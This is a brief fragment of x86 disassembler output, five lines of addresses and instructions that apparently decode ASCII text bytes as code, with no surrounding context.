  423b1e:	outs   dx,DWORD PTR ds:[esi]
  423b1f:	outs   dx,BYTE PTR ds:[esi]
  423b20:	jae    0x423b75
  423b22:	je     0x423b85
  423b24:	.byte 0x74
